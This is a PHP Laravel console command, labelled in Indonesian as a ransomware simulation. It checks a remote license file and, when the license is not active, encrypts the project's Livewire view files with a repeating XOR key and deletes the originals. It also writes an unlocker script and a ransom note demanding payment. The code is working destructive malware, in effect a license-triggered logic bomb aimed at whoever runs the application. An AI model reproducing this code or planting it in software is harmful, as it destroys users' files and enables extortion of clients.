<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;

class EncryptFiles extends Command
{
    protected $signature = 'ransom:encrypt';
    protected $description = 'Simulasi ransomware sederhana — enkripsi file menjadi .sd';

    protected $targets = [
        'resources/views/livewire/peserta',
    ];

    private $password = 'cat2025rahasia';

    private $xorKey = 'AgungSanzCatRansom2025KerenBangetBroGuePunyaIlmuRansomSimulasiCyberSecTeam';

    public function handle()
    {
        $this->info('Mengecek lisensi...');

        try {
            $response = Http::timeout(10)->get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
            $cat = collect($response->json())->firstWhere('code', 'CAT');
        } catch (\Exception $e) {
            $this->warn("Gagal cek lisensi (anggap aktif).");
            return;
        }

        if ($cat && ($cat['status'] ?? '') === 'sanca') {
            $this->info("Lisensi masih aktif. Tidak mengenkripsi apa pun.");
            return;
        }

        $this->alert("⚠ LISENSI MATI — MEMULAI ENKRIPSI FILE!");

        $total = 0;

        foreach ($this->targets as $dir) {
            if (!is_dir($dir)) {
                $this->warn("Folder tidak ditemukan: $dir");
                continue;
            }

            $files = File::allFiles($dir);

            foreach ($files as $file) {
                if ($file->getExtension() === 'sd') continue;

                $path = $file->getRealPath();
                $content = file_get_contents($path);

                $keyRepeated = substr(str_repeat($this->xorKey, ceil(strlen($content) / strlen($this->xorKey))), 0, strlen($content));
                $encrypted = base64_encode($content ^ $keyRepeated);

                $newPath = $path . '.sd';
                file_put_contents($newPath, $encrypted);
                unlink($path);

                $this->line("Encrypted: " . $file->getFilename() . " → " . basename($newPath));
                $total++;
            }
        }

        File::put(storage_path('app/.ransom_pass'), $this->password);
        File::put(storage_path('app/.ransom_key'), $this->xorKey);
        File::put(storage_path('app/.ransom_target'), json_encode($this->targets));

        $this->generateUnlocker();

        $this->error("Selesai! $total file berhasil dienkripsi.");
        $this->info("Gunakan php artisan ransom:unlock {password} untuk membuka file.");
    }

    private function generateUnlocker()
    {
        $targetsJson = json_encode($this->targets);

        $phpScript = <<<PHP
<?php

echo "===============================================================\\n";
echo "         CAT-RANSOM SIMULATION - UNLOCKER 2025\\n";
echo "===============================================================\\n\\n";

echo "Masukkan password: ";
\$pass = trim(fgets(STDIN));

if (\$pass !== '{$this->password}') {
    echo "PASSWORD SALAH! File tetap terkunci.\\n";
    exit;
}

echo "\\nPassword benar — mulai membuka file...\\n\\n";

\$key = file_get_contents(__DIR__ . '/storage/app/.ransom_key');

\$targets = {$targetsJson};

\$restored = 0;

foreach (\$targets as \$dir) {
    if (!is_dir(\$dir)) continue;

    \$iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator(\$dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach (\$iterator as \$file) {
        if (\$file->getExtension() !== 'sd') continue;

        \$path = \$file->getPathname();
        \$enc = file_get_contents(\$path);
        \$raw = base64_decode(\$enc);

        \$keyPart = substr(str_repeat(\$key, ceil(strlen(\$raw) / strlen(\$key))), 0, strlen(\$raw));
        \$dec = \$raw ^ \$keyPart;

        \$orig = preg_replace('/\\.sd$/', '', \$path);
        file_put_contents(\$orig, \$dec);
        unlink(\$path);

        echo "Restored: " . basename(\$orig) . "\\n";
        \$restored++;
    }
}

echo "\\nSUKSES! \$restored file berhasil dikembalikan!\\n";
sleep(2);

PHP;

        File::put(base_path('unlock.php'), $phpScript);
        File::put(base_path('unlock.bat'), "@echo off\ntitle CAT-RANSOM UNLOCKER\nphp \"%~dp0unlock.php\"\npause");
        File::put(base_path('BAYAR_TEBUSAN_DULU.txt'), "PASSWORD: {$this->password}\nGunakan unlock.bat untuk membuka file.");
    }
}
